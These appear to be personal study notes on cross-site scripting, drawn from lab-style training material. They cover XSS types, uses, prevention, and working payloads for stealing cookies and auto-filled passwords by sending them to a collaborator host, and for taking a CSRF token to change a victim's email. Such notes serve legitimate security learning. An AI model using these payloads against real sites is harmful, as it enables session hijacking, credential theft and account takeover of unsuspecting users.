Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data.



->>use the print function instead of the alert() as it give more response and is not blocked by chrome 

type of xss
==
reflected xss: from reflected web page
dom xss : in client side code 
stored xss :from stroed data base 


->>uses of xss
- Impersonate or masquerade as the victim user.
- Carry out any action that the user is able to perform.
- Read any data that the user is able to access.
- Capture the user's login credentials.
- Perform virtual defacement of the web site.
- Inject trojan functionality into the web site.


->> prevention **Filter input on arrival**
->> **Encode data on output**
->> **Use appropriate response headers**
->> **Content Security Policy**

->> cheat sheet ![[cheat-sheet.pdf]]

Some useful ways of executing JavaScript are:

:>`<script>alert(document.domain)</script>
:> \<img src=1 onerror=alert(1)>`

waf bypass
==
:>find tags and events that work with intruder


XSS proof of concept
==
You can confirm most kinds of XSS vulnerability by injecting a payload that causes your own browser to execute some arbitrary JavaScript. It's long been common practice to use the alert() function for this purpose because it's short, harmless, and pretty hard to miss when it's successfully called. In fact, you solve the majority of our XSS labs by invoking alert() in a simulated victim's browser.

Unfortunately, there's a slight hitch if you use Chrome. From version 92 onward (July 20th, 2021), cross-origin iframes are prevented from calling alert(). As these are used to construct some of the more advanced XSS attacks, you'll sometimes need to use an alternative PoC payload. In this scenario, we recommend the print() function. If you're interested in learning more about this change and why we like print(), check out our blog post on the subject.

As the simulated victim in our labs uses Chrome, we've amended the affected labs so that they can also be solved using print(). We've indicated this in the instructions wherever relevant. 

Exploiting Xss for cookies 
====
1. Stealing Cookies
   Stealing cookies is a traditional way to exploit XSS. Most web applications use cookies for session handling. You can exploit cross-site scripting vulnerabilities to send the victim's cookies to your own domain, then manually inject the cookies into the browser and impersonate the victim.

    In practice, this approach has some significant limitations:

    The victim might not be logged in.
    Many applications hide their cookies from JavaScript using the HttpOnly flag.
    Sessions might be locked to additional factors like the user's IP address.
    The session might time out before you're able to hijack it.

  <script>document.location='https://24477lhadnoo12owz3ydv29uvl1cp6dv.oastify.com/?c='+encodeURIComponent(document.cookie)</script>



Exploiting Xss for passwords
==

 These days, many users have password managers that auto-fill their passwords. You can take advantage of this by creating a password input, reading out the auto-filled password, and sending it to your own domain. This technique avoids most of the problems associated with stealing cookies, and can even gain access to every other account where the victim has reused the same password.

The primary disadvantage of this technique is that it only works on users who have a password manager that performs password auto-fill. (Of course, if a user doesn't have a password saved you can still attempt to obtain their password through an on-site phishing attack, but it's not quite the same

payload:

<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">




Exploiting XXS to bypass CSRF
==

 XSS enables an attacker to do almost anything a legitimate user can do on a website. By executing arbitrary JavaScript in a victim's browser, XSS allows you to perform a wide range of actions as if you were the victim user. For example, you might make a victim send a message, accept a friend request, commit a backdoor to a source code repository, or transfer some Bitcoin.

Some websites allow logged-in users to change their email address without re-entering their password. If you've found an XSS vulnerability on one of these sites, you can exploit it to steal a CSRF token. With the token, you can change the victim's email address to one that you control. You can then trigger a password reset to gain access to the account.

This type of exploit combines XSS (to steal the CSRF token) with the functionality typically targeted by CSRF. While traditional CSRF is a "one-way" vulnerability, where the attacker can induce the victim to send requests but cannot see the responses, XSS enables "two-way" communication. This enables the attacker to both send arbitrary requests and read the responses, resulting in a hybrid attack that bypasses anti-CSRF defenses. 




<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>